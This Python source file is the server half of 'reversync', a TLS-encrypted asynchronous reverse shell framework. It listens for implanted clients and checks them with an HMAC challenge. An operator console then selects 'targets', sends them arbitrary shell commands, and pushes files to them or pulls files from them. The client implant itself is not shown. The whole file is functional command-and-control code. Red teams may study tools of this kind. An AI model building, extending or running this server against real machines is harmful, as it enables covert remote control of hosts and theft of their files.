import asyncio
import base64
import hashlib
import hmac
import secrets
import ssl
import json
import struct
import subprocess
import sys
from asyncio import CancelledError, IncompleteReadError
from rich.progress import Progress, SpinnerColumn, TimeElapsedColumn
from interactiveconsole import InteractiveConsole
from targetsInfo import TargetInfo, Targets
from pathlib import Path
import argparse


def parse_arguments():
    """
    Parse and return command-line arguments for the TLS reverse shell server.
    Includes certificate, key, password, IP address, and port configuration.
    """
    parser = argparse.ArgumentParser(
        description="reversync is a secure, asynchronous Python reverse shell framework"
                    " using SSL and asyncio for remote command execution. "
    )

    parser.add_argument(
        '--cert',
        help='Path to TLS certificate file (default: cert.pem)',
        default='cert.pem'
    )

    parser.add_argument(
        '--key',
        help='Path to TLS private key file (default: key.pem)',
        default='key.pem'
    )

    parser.add_argument(
        '--pswd',
        help='Path to password file used for authentication (default: pswd)',
        default='pswd'
    )

    parser.add_argument(
        '--listen',
        help='IP address to bind and listen on (default: 127.0.0.1)',
        default='127.0.0.1'
    )

    parser.add_argument(
        '--port',
        type=int,
        help='Port number to listen on (default: 1234)',
        default=1234
    )

    return parser.parse_args()


async def send(writer: asyncio.StreamWriter, data: bytes):
    """
    Sends command to the target.
    """
    length = struct.pack(">I", len(data))
    writer.write(length + data)
    await writer.drain()


async def save_file(file_name,file_stat, data):
    save_path = Path(targets.host_cwd) / file_name
    if file_stat == 'start':
        save_path.touch()
        return
    if file_stat == 'end':
        console.output = (f"[+] File '{file_name}' saved to {save_path}\n"
                          f"[+] File size: {save_path.stat().st_size} bytes")
        return
    if file_stat == 'sending':
        file_data = base64.b64decode(data['data'])
        with open(save_path, 'ab') as file:
            file.write(file_data)
    return


async def upload(file, dpath, writer: asyncio.StreamWriter):
    """
    Asynchronously uploads a file to a remote target using a stream writer.

    The function sends a JSON-encoded control message to initiate the transfer,
    streams the file in base64-encoded chunks with real-time progress reporting,
    and sends a final message indicating the end of the transfer. Errors such as
    permission issues or missing files are gracefully handled.

    Args:
        file (str or Path): Path to the local file to be uploaded.
        dpath (str): Remote destination path where the file should be stored.
        writer (asyncio.StreamWriter): Stream writer used to send data to the target.

    """
    try:
        # Open the file in binary read mode
        with open(file, 'rb') as f:
            chunk_size = 8192  # 8KB per chunk
            total_size = Path(file).stat().st_size  # Get total size for progress tracking

            console._clear_prompt()
            console.line()
            console.log(f'Transferring file {Path(file).name} to target host {targets.hostname} at address {targets.current_address}')
            print()

            # Show live progress bar during transferring
            with Progress(
                SpinnerColumn(),
                *Progress.get_default_columns(),
                TimeElapsedColumn(),
            ) as progress:
                task = progress.add_task("Uploading", total=total_size)

                while True:
                    # Read next chunk from file
                    chunk = f.read(chunk_size)
                    progress.update(task, advance=chunk_size)

                    # If no more data, break the loop
                    if not chunk:
                        break

                    # Encode chunk as base64 and send with 'sending' status
                    encoded_data = base64.b64encode(chunk).decode('ascii')
                    data = json.dumps(
                        {'cmd': 'push', 'stat': 'sending', 'type': 'file', 'source_file': Path(file).name,
                         'destination': dpath, 'data': encoded_data})
                    await send(writer, data.encode('ascii'))
        data = json.dumps(
                {'cmd': 'push', 'stat': 'end', 'type': 'file', 'source_file': Path(file).name,'destination': dpath})
        await send(writer, data.encode('ascii'))
        print()
        console.log(f'All files have been successfully transferred to {targets.hostname} at {targets.current_address}')
        console.line()
        return

    # Handle common file-related errors gracefully
    except IsADirectoryError:
        console.error = f'{file} is a Directory'
    except PermissionError:
        console.error = f'Permission denied: {file}'
    except FileNotFoundError:
        console.error = f'No such file: {file}'
    return

def setup_data(data: bytes, address: str):
    jdata = json.loads(data.decode('ascii'))
    targets.info[address].cwd = jdata['cwd']
    targets.info[address].hostname = jdata['hostname']
    targets.info[address].username = jdata['username']
    return jdata


def resolve_path(path: str) -> str:
    """
        Resolves the path to an absolute path, handling user home (~) and empty input.
        """
    if not path:
        return str(Path.home())
    if path.startswith('~'):
        return str(Path(path).expanduser())
    return str(Path(path).absolute())


async def perform_hmac_challenge(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> bool:
    """
    Performs a basic HMAC-based challenge-response authentication with the client.

    Steps:
    1. Server generates a random challenge and sends it to the client.
    2. Client computes HMAC(challenge, shared_secret) and returns it.
    3. Server verifies it by computing the expected HMAC and comparing it securely.

    Returns:
        True if the client is authenticated successfully, False otherwise.
    """
    # Step 1: Generate a secure 64-byte challenge
    challenge = secrets.token_bytes(64)
    writer.write(challenge)
    await writer.drain()

    try:
        # Step 2: Wait for client's response (HMAC) with a timeout
        client_response = await asyncio.wait_for(reader.read(1024), timeout=5)
    except asyncio.TimeoutError:
        console.error = 'timeout error'
        return False

    try:
        # Step 3: Read the shared secret from file
        with open(PASSWORD_FILE, 'rb') as key_file:
            shared_secret = key_file.readline().strip()

        # Step 4: Generate expected HMAC using the shared secret and the original challenge
        expected_response = hmac.new(shared_secret, challenge, hashlib.sha256).digest()

        # Step 5: Securely compare client response with expected response
        return hmac.compare_digest(expected_response, client_response)

    except (FileNotFoundError, IOError):
        console.error = "Secret key file missing or unreadable"
        return False


async def handle_reverse_shell_connection(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    """
    Handles an active reverse shell session with a connected client.


    :param reader: asyncio.StreamReader — used to read incoming data from the client.
    :param writer: asyncio.StreamWriter — used to send data to the client.

    This function maintains a continuous session with a client,
    reading responses until the connection is closed or cancelled.
    """
    auth = await perform_hmac_challenge(reader, writer)
    if not auth:
        console.error = f"[-] Refuse the connection from {writer.get_extra_info('peername')}"
        writer.close()
        await writer.wait_closed()
        return None
    data = json.dumps({'status': 'accept'}, indent=4).encode()
    await send(writer, data)
    client_address = writer.get_extra_info('peername')
    targets.connections[client_address] = writer
    targets.info[client_address] = TargetInfo(address=client_address)
    console.output = f"[+] Connection established from {client_address}. Type 'stop <int>' to terminate session."

    try:
        while True:
            header = await reader.readexactly(4)
            length = struct.unpack(">I", header)[0]
            response = await reader.readexactly(length)
            response = setup_data(response, client_address)
            if client_address == targets.current_address:
                console.shell_prompt = targets.prompt
            if response['stdout']:
                console.output = response['stdout']
            if response['stderr']:
                console.error = response['stderr']
            if response['type']:
                # Decode metadata and file content
                file_info = json.loads(response['type'])
                cmd = file_info['cmd']
                file_stat = file_info['stat']
                if cmd == 'push':
                    dpath = file_info['destination_path']
                    if file_stat == 'start':
                        await upload(targets.uploading_file, dpath, writer)
                elif cmd == 'pull':
                    file_name = file_info['source_file']
                    asyncio.create_task(save_file(file_name, file_stat, file_info))


    except CancelledError as cancel_err:
        console.output = f"[-] Connection reader was cancelled: {cancel_err}"
    except IncompleteReadError:
        console.output = "[-] Target disconnected unexpectedly."
    finally:
        # Clean up on disconnection
        targets.delete(client_address)

        if client_address == targets.current_target:
            targets.current_target = ''
            console.clear()

        writer.close()
        await writer.wait_closed()
        console.output = "[-] Connection closed cleanly."


class TargetControlConsole:
    def __init__(self, shutdown_event: asyncio.Event):
        """
        Initializes the TargetControlConsole class for handling server-side shell interactions.

        :param shutdown_event: asyncio.Event — used to signal server shutdown.
        """
        self.shutdown_event = shutdown_event

    async def server_console(self):
        """
        Main interactive loop for the server-side console.
        Accepts commands from the operator and sends them to the selected client.
        """
        try:
            while True:
                command = await asyncio.get_running_loop().run_in_executor(None, console.input)

                if not command:
                    continue

                command_lower = command.split()[0].lower()
                arg = command.split()[1:]

                if command_lower == "targets":
                    console.output = f'{targets}'
                    continue

                if command_lower == "help" and not targets.current_target:
                    console.output = (
                        "Available Commands:\n"
                        " [+] help                      - Show this help menu\n"
                        " [+] exit                      - Exit from the current target session\n"
                        " [+] sysinfo                   - Retrieve system information from the target machine\n"
                        " [+] targets                   - List all connected machines\n"
                        " [+] select <int>              - Select a target machine by its index\n"
                        " [+] clear                     - Clear the console output\n"
                        " [+] stop <int>                - Disconnect a target\n"
                        " [+] shutdown                  - Shut down the server and disconnect all targets\n"
                        " [+] pull -s <target file> -d <destination storage>\n"
                        "   Options:\n"
                        "     -s <target file>          - Pull file from the specified target.\n"
                        "     -d <destination storage>  - Save the file to the specified location.\n"
                        " [+] push -s <target file> -d <destination storage>\n"
                        "   Options:\n"
                        "     -s <target file>          - File to be pushed from the local system.\n"
                        "     -d <destination storage>  - Remote destination where the file will be saved.\n"
                    )
                    continue

                if command_lower == "shutdown" and not targets.current_target:
                    console.output = "[-] Closing connection and shutting down server..."
                    break

                if command_lower == "exit":
                    targets.current_target = ''
                    console.clear()
                    continue

                if command_lower == "clear":
                    subprocess.call("clear")
                    continue

                # Check for connected clients.
                if not list(targets.connections):
                    console.output = '[-] No client has connected yet...'
                    continue

                if command_lower == "stop":
                    try:
                        index = int(arg[0])
                        addr = targets.get_target_address(index - 1)
                        targets.connections[addr].close()
                    except (IndexError, ValueError):
                        console.output = "[-] Invalid target index."
                    continue

                if command_lower == "select":
                    try:
                        index = int(arg[0])
                        targets.change_target(index - 1)
                        console.shell_prompt = targets.prompt
                    except (IndexError, ValueError):
                        console.output = "[-] Invalid target index."
                    continue

                # If a client is selected, send the command
                if targets.current_address:
                    writer = targets.connections.get(targets.current_address)
                    if writer:
                        if command_lower == "pull":
                            if not '-s' in arg:
                                console.error = 'No file specified'
                                continue
                            try:
                                index = arg.index('-s')
                                file = arg[index + 1]
                                if '-d' in arg:
                                    index = arg.index('-d')
                                    path = resolve_path(arg[index + 1])
                                    if not Path(path).exists():
                                        console.error = f'{path} does not exist'
                                        continue
                                    if not Path(path).is_dir():
                                        console.error = f'{path} is not a directory'
                                        continue
                                    if Path(path).owner() == 'root':
                                        console.error = f'Permission denied: {path}'
                                        continue
                                    targets.host_cwd = path

                                data = json.dumps({'cmd': 'pull', 'file': file}).encode()
                                await send(writer, data)
                            except (IndexError, ValueError):
                                console.error = 'No file specified'
                                continue
                        elif command_lower == "push":
                            if not '-s' in arg:
                                console.error = 'No file specified'
                                continue
                            dpath = ''
                            if '-d' in arg:
                                index = arg.index('-d')
                                try:
                                    dpath = arg[index + 1]
                                except (IndexError, ValueError):
                                    dpath = ''
                            try:
                                index = arg.index('-s')
                                file = resolve_path(arg[index + 1])
                                targets.uploading_file = file
                                # Send initial command to notify the receiver of an incoming file
                                data = json.dumps(
                                    {'cmd': 'push', 'stat': 'pending', 'type': 'file', 'source_file': Path(file).name,
                                     'destination': dpath})
                                await send(writer, data.encode('ascii'))
                            except (IndexError, ValueError):
                                console.error = 'No file specified'
                        else:
                            data = json.dumps({'cmd': command}).encode()
                            await send(writer, data)
                    else:
                        console.output = "[-] Selected client is no longer connected."
                else:
                    console.output = '[-] Select a target using "select target <int>"'

        except CancelledError:
            console.output = '[-] Console task cancelled by asyncio.'

        finally:
            # Close all active connections
            for addr in list(targets.connections):
                targets.connections[addr].close()
                await targets.connections[addr].wait_closed()
                targets.delete(addr)

            self.shutdown_event.set()
            targets.current_target = ''
            console.clear()
            console.output = "[-] Server console shutdown complete."


def verify_files(cert: str, private_key: str, key: str):
    return all(Path(file).exists() for file in [cert, private_key, key])


async def run_reverse_shell_server():
    """
    Initializes and runs the reverse shell server.
    - Listens for incoming client connections on SERVER_HOST:SERVER_PORT.
    - Starts an interactive server console for operator input.
    - Waits for shutdown signal from the console to gracefully terminate.
    """
    shutdown_event = asyncio.Event()
    server_console = TargetControlConsole(shutdown_event)
    console_task = asyncio.create_task(server_console.server_console())

    # Small delay to ensure console starts before accepting connections
    await asyncio.sleep(0.1)
    ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_ctx.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
    try:
        # Try to bind to the specified host and port
        server = await asyncio.start_server(
            handle_reverse_shell_connection,
            SERVER_HOST,
            SERVER_PORT,
            reuse_address=True,  # optional but helpful on restarts
            ssl=ssl_ctx
        )
    except OSError as e:
        if e.errno == 98:
            console.error = f"[-] Port {SERVER_PORT} is already in use."
        elif e.errno == 13:
            console.error = f"[-] Permission denied: you need elevated privileges to bind to port {SERVER_PORT}."
        else:
            console.error = f"[-] Failed to start server: {e}"
        console_task.cancel()
        await asyncio.sleep(0.1)  # Give time for cancel to propagate
        console.exit()
        console.output = "[-] Reverse shell server terminated."
        return

    console.output = f"[+] Listening for incoming connections on {SERVER_HOST}:{SERVER_PORT}"

    try:
        async with server:
            await shutdown_event.wait()  # Wait for the handler to signal shutdown
            console.output = "[-] Shutdown signal received. Closing server..."
            server.close()
            await server.wait_closed()

    except CancelledError as cancel_err:
        if not server.is_serving():
            server.close()
            await server.wait_closed()
        console.output = f"[-] Server shutdown requested. {cancel_err}"

    finally:
        console_task.cancel()
        await asyncio.sleep(0.1)  # Give time for cancel to propagate
        console.exit()
        console.output = "[-] Reverse shell server terminated."


# Entry point for starting the reverse shell server
if __name__ == "__main__":
    # Initialize target manager and main console instance
    args = parse_arguments()
    SERVER_HOST = args.listen
    SERVER_PORT = args.port
    CERT_FILE = args.cert
    KEY_FILE = args.key
    PASSWORD_FILE = args.pswd
    targets = Targets()
    console = InteractiveConsole(logo="reversync", shell='@remote-shell > ')
    if not verify_files(CERT_FILE, KEY_FILE, PASSWORD_FILE):
        console.error = 'File verification failed.'
        sys.exit(0)
    try:
        asyncio.run(run_reverse_shell_server())
    except OSError as e:
        # Handles binding errors and general socket issues
        error_message = e.strerror if e.strerror else str(e)
        console.output = f"[-] OS Error: {error_message}"
    except KeyboardInterrupt:
        # Clean shutdown on Ctrl+C
        console.output = "[-] Interrupted by user. Closing connection."
    except Exception as e:
        # Catch-all for unexpected errors
        console.output = f"[-] Unexpected error: {type(e).__name__}: {e}"
